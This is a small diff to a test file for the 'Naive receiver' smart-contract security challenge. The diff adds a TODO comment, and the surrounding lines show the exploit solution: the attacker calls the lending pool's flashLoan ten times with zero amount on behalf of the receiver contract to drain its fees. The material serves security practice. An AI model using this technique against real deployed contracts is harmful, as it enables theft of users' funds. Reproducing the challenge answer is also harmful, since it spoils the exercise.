@@ -31,6 +31,7 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //TODO: find alternative exploit to achieve same result in 1 TX
         for (let i = 0; i < 10; i++) {
            await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
         }
